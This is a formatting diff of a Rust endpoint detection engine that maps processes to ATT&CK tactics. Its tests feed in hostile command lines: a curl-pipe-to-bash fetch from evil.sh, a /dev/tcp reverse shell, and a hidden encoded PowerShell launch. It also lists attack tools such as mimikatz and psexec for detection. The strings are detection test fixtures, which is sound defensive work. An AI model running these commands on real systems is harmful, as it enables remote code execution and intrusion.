@@ -103,7 +103,9 @@ pub fn tactic_of(technique: &str) -> &'static str {
         "T1218" | "T1027" | "T1562" | "T1070" | "T1140" | "T1211" | "T1112" | "T1055" | "T1036"
         | "T1222" => "Defense Evasion",
         "T1003" | "T1552" | "T1555" => "Credential Access",
-        "T1087" | "T1082" | "T1016" | "T1049" | "T1018" | "T1482" | "T1033" | "T1007" => "Discovery",
+        "T1087" | "T1082" | "T1016" | "T1049" | "T1018" | "T1482" | "T1033" | "T1007" => {
+            "Discovery"
+        }
         "T1021" => "Lateral Movement",
         "T1105" | "T1071" | "T1571" | "T1095" | "T1090" | "T1572" => "Command and Control",
         "T1048" | "T1567" => "Exfiltration",
@@ -121,9 +123,24 @@ pub fn tactic_of(technique: &str) -> &'static str {
 /// `powershell.exe` ou un `mimikatz.exe` ne l'est pas.
 fn masqueraded_tool(ev: &Event) -> Option<String> {
     const SENSITIVE: &[&str] = &[
-        "cmd", "powershell", "pwsh", "rundll32", "regsvr32", "mshta", "wscript",
-        "cscript", "certutil", "bitsadmin", "wmic", "mimikatz", "psexec",
-        "psexesvc", "net", "nltest", "ntdsutil", "vssadmin",
+        "cmd",
+        "powershell",
+        "pwsh",
+        "rundll32",
+        "regsvr32",
+        "mshta",
+        "wscript",
+        "cscript",
+        "certutil",
+        "bitsadmin",
+        "wmic",
+        "mimikatz",
+        "psexec",
+        "psexesvc",
+        "net",
+        "nltest",
+        "ntdsutil",
+        "vssadmin",
     ];
     if ev.original_file_name.is_empty() || ev.image.is_empty() {
         return None;
@@ -373,7 +390,12 @@ impl Engine {
 
         // Allowlist (faux positifs) puis deduplication.
         let ev_ref = &ev;
-        alerts.retain(|a| !self.allowlist.iter().any(|s| s.matches_alert(&a.rule_id, ev_ref)));
+        alerts.retain(|a| {
+            !self
+                .allowlist
+                .iter()
+                .any(|s| s.matches_alert(&a.rule_id, ev_ref))
+        });
         let mut kept = Vec::with_capacity(alerts.len());
         for a in alerts {
             if !self.is_duplicate(&a, now) {
@@ -478,7 +500,11 @@ mod tests {
         let eng = Engine::with_builtin_rules().unwrap();
         let cov = eng.attack_coverage();
         // couverture large et triée/unique
-        assert!(cov.len() >= 20, "couverture ATT&CK trop faible: {}", cov.len());
+        assert!(
+            cov.len() >= 20,
+            "couverture ATT&CK trop faible: {}",
+            cov.len()
+        );
         assert!(cov.contains(&"T1003".to_string())); // credential dumping
         assert!(cov.contains(&"T1486".to_string())); // ransomware
         assert!(cov.windows(2).all(|w| w[0] < w[1])); // trié, sans doublon
@@ -552,7 +578,11 @@ mod tests {
         assert!(cr.live >= 40, "trop peu de règles live : {}", cr.live);
         // Les types non collectés en live doivent être signalés (réseau, fichier,
         // image, accès-processus, thread-distant, tube-nommé).
-        assert!(cr.simulation_only >= 6, "attendu >=6 sim-only, obtenu {}", cr.simulation_only);
+        assert!(
+            cr.simulation_only >= 6,
+            "attendu >=6 sim-only, obtenu {}",
+            cr.simulation_only
+        );
         // SNT-0300 (accès handle LSASS) n'a pas de source live → simulation-seulement.
         assert!(cr.simulation_only_rules.iter().any(|r| r == "SNT-0300"));
     }
@@ -605,7 +635,10 @@ mod tests {
             "SNT-0050", // suppression shadow copies
             "SNT-0051", // sabotage bcdedit
         ] {
-            assert!(fired.contains(rid), "détection manquante dans la chaîne : {rid}");
+            assert!(
+                fired.contains(rid),
+                "détection manquante dans la chaîne : {rid}"
+            );
         }
     }
 
@@ -652,25 +685,48 @@ mod tests {
                 .collect()
         };
         // curl | bash
-        assert!(fire(&mut eng, "/bin/bash", "bash -c curl http://evil.sh/x | bash")
-            .contains(&"SNT-1000".to_string()));
+        assert!(fire(
+            &mut eng,
+            "/bin/bash",
+            "bash -c curl http://evil.sh/x | bash"
+        )
+        .contains(&"SNT-1000".to_string()));
         // reverse shell /dev/tcp
-        assert!(fire(&mut eng, "/bin/bash", "bash -c bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
-            .contains(&"SNT-1002".to_string()));
+        assert!(fire(
+            &mut eng,
+            "/bin/bash",
+            "bash -c bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
+        )
+        .contains(&"SNT-1002".to_string()));
         // osascript do shell script (macOS)
-        assert!(fire(&mut eng, "/usr/bin/osascript", "osascript -e do shell script \"whoami\"")
-            .contains(&"SNT-1009".to_string()));
+        assert!(fire(
+            &mut eng,
+            "/usr/bin/osascript",
+            "osascript -e do shell script \"whoami\""
+        )
+        .contains(&"SNT-1009".to_string()));
         // exécution depuis /tmp
-        assert!(fire(&mut eng, "/tmp/payload", "/tmp/payload")
-            .contains(&"SNT-1004".to_string()));
+        assert!(fire(&mut eng, "/tmp/payload", "/tmp/payload").contains(&"SNT-1004".to_string()));
     }
 
     #[test]
     fn office_macro_chain_fires_critical() {
         let mut eng = Engine::with_builtin_rules().unwrap();
         // explorer -> winword -> powershell
-        eng.ingest(Event::process_start("h", 1, 0, r"C:\Windows\explorer.exe", ""));
-        eng.ingest(Event::process_start("h", 2, 1, r"C:\Office\winword.exe", ""));
+        eng.ingest(Event::process_start(
+            "h",
+            1,
+            0,
+            r"C:\Windows\explorer.exe",
+            "",
+        ));
+        eng.ingest(Event::process_start(
+            "h",
+            2,
+            1,
+            r"C:\Office\winword.exe",
+            "",
+        ));
         let alerts = eng.ingest(
             Event::process_start("h", 3, 2, r"C:\W\powershell.exe", "")
                 .with_cmdline("powershell -nop -w hidden -enc ZQBj"),
@@ -686,9 +742,16 @@ mod tests {
     fn alert_carries_ancestry() {
         let mut eng = Engine::with_builtin_rules().unwrap();
         eng.ingest(Event::process_start("h", 1, 0, r"C:\W\explorer.exe", ""));
-        eng.ingest(Event::process_start("h", 2, 1, r"C:\Office\winword.exe", ""));
+        eng.ingest(Event::process_start(
+            "h",
+            2,
+            1,
+            r"C:\Office\winword.exe",
+            "",
+        ));
         let alerts = eng.ingest(
-            Event::process_start("h", 3, 2, r"C:\W\powershell.exe", "").with_cmdline("powershell -enc X"),
+            Event::process_start("h", 3, 2, r"C:\W\powershell.exe", "")
+                .with_cmdline("powershell -enc X"),
         );
         let a = alerts.iter().find(|a| a.rule_id == "SNT-0001").unwrap();
         assert!(a.ancestors.iter().any(|x| x == "winword.exe"));
@@ -734,8 +797,14 @@ mod tests {
     fn allowlist_suppresses_matching_alert() {
         let mut eng = Engine::with_builtin_rules().unwrap();
         let alerts = eng.ingest(
-            Event::process_start("h", 9, 1, r"C:\Windows\System32\schtasks.exe", r"C:\W\explorer.exe")
-                .with_cmdline(r"schtasks /create /tn \sentinelle\maintenance\job"),
+            Event::process_start(
+                "h",
+                9,
+                1,
+                r"C:\Windows\System32\schtasks.exe",
+                r"C:\W\explorer.exe",
+            )
+            .with_cmdline(r"schtasks /create /tn \sentinelle\maintenance\job"),
         );
         // SNT-0031 matcherait, mais ALLOW-0001 le supprime.
         assert!(!alerts.iter().any(|a| a.rule_id == "SNT-0031"));
@@ -767,9 +836,8 @@ mod tests {
     #[test]
     fn ppid_spoofing_fires() {
         let mut eng = Engine::with_builtin_rules().unwrap();
-        let alerts = eng.ingest(
-            Event::process_start("h", 500, 4, r"C:\t\evil.exe", "").with_real_ppid(999),
-        );
+        let alerts =
+            eng.ingest(Event::process_start("h", 500, 4, r"C:\t\evil.exe", "").with_real_ppid(999));
         assert!(alerts.iter().any(|a| a.rule_id == "SNT-B003"));
     }
 
@@ -797,16 +865,24 @@ mod tests {
     #[test]
     fn remote_thread_injection_fires() {
         let mut eng = Engine::with_builtin_rules().unwrap();
-        let alerts =
-            eng.ingest(Event::remote_thread("h", 50, r"C:\W\powershell.exe", r"C:\W\explorer.exe"));
+        let alerts = eng.ingest(Event::remote_thread(
+            "h",
+            50,
+            r"C:\W\powershell.exe",
+            r"C:\W\explorer.exe",
+        ));
         assert!(alerts.iter().any(|a| a.rule_id == "SNT-0310"));
     }
 
     #[test]
     fn c2_named_pipe_fires() {
         let mut eng = Engine::with_builtin_rules().unwrap();
-        let alerts =
-            eng.ingest(Event::named_pipe("h", 50, r"C:\W\powershell.exe", r"\\.\pipe\msagent_7f"));
+        let alerts = eng.ingest(Event::named_pipe(
+            "h",
+            50,
+            r"C:\W\powershell.exe",
+            r"\\.\pipe\msagent_7f",
+        ));
         assert!(alerts.iter().any(|a| a.rule_id == "SNT-0320"));
     }
 
@@ -862,8 +938,13 @@ mod tests {
         });
         let mut fired = false;
         for i in 0..3u32 {
-            let alerts =
-                eng.ingest(Event::process_start("h", 200 + i, 9, r"C:\t\x.exe", r"C:\t\p.exe"));
+            let alerts = eng.ingest(Event::process_start(
+                "h",
+                200 + i,
+                9,
+                r"C:\t\x.exe",
+                r"C:\t\p.exe",
+            ));
             if alerts.iter().any(|a| a.rule_id == "SNT-B001") {
                 fired = true;
             }
